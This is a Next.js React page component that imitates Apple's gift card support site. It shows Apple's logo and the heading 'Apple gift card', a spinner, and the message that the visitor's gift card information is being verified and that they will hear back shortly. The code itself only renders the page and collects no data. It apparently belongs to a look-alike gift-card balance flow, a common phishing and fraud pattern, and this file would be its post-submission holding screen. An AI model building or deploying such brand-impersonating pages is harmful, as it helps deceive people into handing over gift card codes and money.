import Link from 'next/link';
import { Navbar, Container } from 'react-bootstrap';

export default function handlecheck() {
  return (
    <div
      className="main-wrapper"
      style={{
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        background: '#fff'
      }}
    >
      {/* Header */}
      <header>
        <Navbar className="custom-navbar" variant="light" expand="lg">
          <Container fluid style={{ paddingLeft: '2rem', paddingRight: '2rem' }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              width: '100%'
            }}>
              {/* Left: Apple Logo */}
              <Link href="/" passHref legacyBehavior>
                <Navbar.Brand style={{ padding: 0 }}>
                  <img
                    src="/appleLogo.jpg"
                    alt="Apple Logo"
                    style={{ height: '40px', width: 'auto', display: 'block' }}
                  />
                </Navbar.Brand>
              </Link>
              {/* Right: Search and Hamburger */}
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '2rem'
              }}>
                <button
                  style={{
                    background: 'none',
                    border: 'none',
                    padding: 0,
                    margin: 0,
                    cursor: 'pointer',
                    fontSize: '1.5rem',
                    color: '#222'
                  }}
                  aria-label="Search"
                  onClick={() => window.open('https://www.apple.com/us/search', '_blank')}
                >
                  <i className="bi bi-search"></i>
                </button>
                <button
                  style={{
                    background: 'none',
                    border: 'none',
                    padding: 0,
                    margin: 0,
                    cursor: 'pointer',
                    fontSize: '1.7rem',
                    color: '#222'
                  }}
                  aria-label="Menu"
                >
                  <i className="bi bi-list"></i>
                </button>
              </div>
            </div>
          </Container>
        </Navbar>
      </header>

      {/* Responsive Div */}
      <main
        className="main-content"
        style={{
          flex: 1,
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'flex-start',
          width: '100%',
          paddingLeft: 0,
          paddingRight: 0,
          background: '#fff'
        }}
      >
        <div className="responsive-row">
          {/* Left: Heading */}
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', padding: '15px' }}>
            <h1 className="giftcard-heading" style={{ fontWeight: 'bold', marginBottom: 0, textAlign: 'left' }}>Apple gift card</h1>
          </div>
          {/* Right side intentionally left blank */}
        </div>
        {/* Divider */}
        <hr style={{ width: '100%', margin: 0, borderTop: '1.5px solid #ddd' }} />
        {/* Centered message */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          flex: 1,
          minHeight: '350px',
          background: 'linear-gradient(135deg, #f5f5f7 0%, #e9e9ee 100%)',
          borderRadius: '24px',
          boxShadow: '0 4px 24px rgba(0,0,0,0.07)',
          margin: '2rem auto',
          maxWidth: '600px',
          padding: '2.5rem 2rem'
        }}>
          {/* Loading Spinner */}
          <div style={{
            width: '60px',
            height: '60px',
            border: '4px solid #f3f3f3',
            borderTop: '4px solid #0071e3',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite',
            marginBottom: '24px'
          }}></div>
          <h2 style={{ fontWeight: 'bold', fontSize: '2rem', margin: '0 0 1.2rem 0', textAlign: 'center', color: '#222' }}>
            Processing Your Request
          </h2>
          <p style={{ fontSize: '1.15rem', color: '#444', textAlign: 'center', maxWidth: '500px', marginBottom: 24 }}>
            We're verifying your gift card information. we will get back to you shortly...
          </p>
          
          {/* Go back to home button */}
          <Link href="/" passHref legacyBehavior>
            <button style={{
              background: '#fff',
              color: '#0071e3',
              border: '2px solid #0071e3',
              borderRadius: 26,
              fontWeight: 'bold',
              fontSize: '1rem',
              padding: '0.7rem 2rem',
              cursor: 'pointer',
              marginBottom: '16px'
            }}>Go back to home</button>
          </Link>

          {/* Progress dots */}
          <div style={{ display: 'flex', gap: '8px', marginTop: '16px' }}>
            <div style={{
              width: '8px',
              height: '8px',
              borderRadius: '50%',
              backgroundColor: '#0071e3',
              animation: 'pulse 1.5s ease-in-out infinite'
            }}></div>
            <div style={{
              width: '8px',
              height: '8px',
              borderRadius: '50%',
              backgroundColor: '#0071e3',
              animation: 'pulse 1.5s ease-in-out 0.3s infinite'
            }}></div>
            <div style={{
              width: '8px',
              height: '8px',
              borderRadius: '50%',
              backgroundColor: '#0071e3',
              animation: 'pulse 1.5s ease-in-out 0.6s infinite'
            }}></div>
          </div>
        </div>

        {/* CSS Animations */}
        <style jsx>{`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          
          @keyframes pulse {
            0%, 80%, 100% {
              opacity: 0.3;
              transform: scale(0.8);
            }
            40% {
              opacity: 1;
              transform: scale(1);
            }
          }
        `}</style>
      </main>

      {/* Footer */}
      <footer
        style={{
          width: '100vw',
          background: '#f5f5f7',
          marginTop: '2.5rem',
          padding: '1.2rem 0',
          display: 'flex',
          justifyContent: 'center',
          borderTop: '1px solid #e0e0e0',
          position: 'relative',
          left: '50%',
          transform: 'translateX(-50%)'
        }}
      >
        <div
          style={{
            width: '100%',
            maxWidth: '900px',
            display: 'flex',
            alignItems: 'center',
            gap: '1.2rem',
            paddingLeft: '0.5rem'
          }}
        >
          {/* Apple logo */}
          <img
            src="/appleLogo.jpg"
            alt="Apple Logo"
            style={{ height: '28px', width: 'auto', display: 'block' }}
          />
          {/* Divider */}
          <span style={{
            display: 'inline-block',
            width: '1px',
            height: '22px',
            background: '#ccc',
            margin: '0 1.2rem'
          }} />
          {/* Support text */}
          <span style={{ color: '#222', fontSize: '1rem', fontWeight: 500 }}>Support</span>
          {/* Divider */}
          <span style={{
            display: 'inline-block',
            width: '1px',
            height: '22px',
            background: '#ccc',
            margin: '0 1.2rem'
          }} />
          {/* Check your gift card balance text */}
          <span style={{ color: '#222', fontSize: '1rem', fontWeight: 500 }}>Check your gift card balance</span>
        </div>
      </footer>
    </div>
  );
}
